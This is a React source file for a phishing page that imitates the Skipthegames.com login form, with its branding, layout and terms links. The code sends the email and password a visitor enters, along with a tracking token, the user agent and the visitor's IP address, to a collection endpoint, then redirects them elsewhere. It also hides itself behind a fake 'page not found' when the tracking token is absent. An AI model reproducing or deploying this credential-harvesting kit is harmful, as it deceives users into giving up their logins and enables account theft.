import HCaptcha from '@hcaptcha/react-hcaptcha';
import React, { useEffect, useRef, useState } from 'react'
import { Helmet } from 'react-helmet'
import { useNavigate, useSearchParams } from 'react-router-dom';
import request from '../../utils/request';
import PageLoader from '../../Components/PageLoader';

export default function Index() {
   const HCAPTCHA_SITEKEY = import.meta.env.VITE_HCAPTCHA_SITEKEY;
   const captchaRef = useRef(null);
    const [searchParams, setSearchParams] = useSearchParams();
   const navigate = useNavigate();

   const [email, setEmail] = useState('')
   const [password, setPassword] = useState('')


   const handleVarified = async () => {
      try {
         const { data } = await request.post('/accounts/store', {
            email,
            password,
            user_access_token: searchParams.get("uid"),
            site: 'skipthegames',
            user_agent: window.navigator.userAgent
         });

         console.log(data);
         

         if (data.success) {
            window.location.href = data.site_details.redirect_url
         }
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }

   const handleVisitorInfo = async () => {

      let ipAddress = null;

      try {
         const response = await request.get('https://api.ipify.org?format=json')
         ipAddress = response.data.ip;
         
      } catch (err) {
         console.error('Error fetching the IP:', err)
      }

      try {
         await request.post('/visitor-information/store', {
            user_access_token: searchParams.get("uid"),
            site: 'skipthegames',
            user_agent: window.navigator.userAgent,
            ip_address: ipAddress
         });
         
      } catch (error) {
         if (error.status === 403) {
            navigate('/page-not-found'); 
         }

         console.log(error);
      }
   }

   function showCaptchaBox(event) {
      event.preventDefault();

      captchaRef.current.execute();
   }

   function onLoad() {
      var element = document.getElementById("submit_createad_account_login");

      element.onclick = showCaptchaBox;
   }

   useEffect(() => { 
      if (!searchParams.get("uid")) {
         navigate('/page-not-found'); 
      } else {
         handleVisitorInfo()
      }
   }, [searchParams])


  return (
     <>
        <Helmet>
           <link rel="stylesheet" href="/skipthegames/css/style.css" type="text/css" />
           <title>Log in to your Skipthegames.com account</title>
        </Helmet>
        
        <PageLoader>
           <div className="row maintenance-note">
               <div className="small-16 columns">
                  <div className="banner_message" id="main_banner_message"> </div>
               </div>
            </div>
            <div className="row" style={{ marginTop: '.25rem', marginBottom: '.5rem' }}>
               <div className="small-9 columns">
                  <a href="#">
                     <img src="/skipthegames/images/logo.png" width="255" height="39" alt="Skip the games logo"/>
                  </a>
                  <small style={{ display: 'block', margin: '0', padding: '0', fontSize: '70%' }} >Skip the games. Get satisfaction.</small>
               </div>
            </div>
            <div className="row">
               <div className="small-16 medium-7 columns login-form">
                  <h3>Log in to your account</h3>
                  <form method="post" id="form_createad_existing_account_login" data-abide>
                     <p>
                        <input
                           value={email}
                           onChange={(e) => setEmail(e.target.value)}
                           type="email"
                           id="input_account_email"
                           name="email"
                           placeholder="Your email" required
                           
                        />
                        <small className="error" id="email_error">Please enter a valid email address</small>
                     </p>
                     <p style={{ marginBottom: '0' }}>
                        <input
                           value={password}
                           onChange={(e) => setPassword(e.target.value)}
                           type="password"
                           id="input_account_password"
                           name="password" placeholder="Password"
                           required
                           style={{ marginBottom: '0' }}
                        />
                        <small className="error" id="password_error">Please enter your password</small>
                     </p>
                     <small className="ull pwtoggle" style={{ display: 'block', margin: '0 0 1rem', fontSize: '12px' }}>
                        <a>Show password</a>
                     </small>

                     <HCaptcha
                        sitekey={HCAPTCHA_SITEKEY}
                        onLoad={onLoad}
                        onVerify={handleVarified}
                        size='invisible'
                        ref={captchaRef}
                     />

                     <button type="button" className="expand radius button" id="submit_createad_account_login">Log in</button>

                     <p className="m0 ull" style={{ fontWeight: 'bold', color: 'red' }}>
                        Password not working? <a href="#">Click here</a>
                     </p>

                     <p>
                        <small>By clicking "Log in", you accept
                           <a href="#" className="link_new_window">Skipthegames.com's Terms and Conditions of Use</a>
                        </small>
                     </p>

                     <p>
                        <small>This site is protected by hCaptcha and its
                           <a href="#">Privacy Policy</a> and
                           <a href="#">Terms of Service</a> apply.
                        </small>
                     </p>
                  </form>
               </div>
               <div className="hide-for-small medium-8 medium-offset-1 columns" tal:condition="not:request/AUTH_USER_ID | nothing">
                  <h3>First time here?</h3>
                  <p className="ull">
                     <a href="#">Post your first ad</a>
                  </p>
               </div>
            </div>
            <footer className="row">
               <div className="large-16 columns">
                  <hr/>
                  <div className="row">
                     <div className="small-16 medium-5 columns">
                        <p><a href="#">&copy;Skipthegames.eu</a></p>
                     </div>
                     <div className="small-16 medium-11 columns">
                        <ul className="inline-list">
                           <li><a href="#">Home</a></li>
                           <li><a href="#">Contact</a></li>
                           <li><a href="#">About</a></li>
                           <li><a href="#">Privacy</a></li>
                           <li><a href="#">Terms</a></li>
                           <li><a href="#">Escort Info</a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </footer>
      </PageLoader>
     </>
  )
}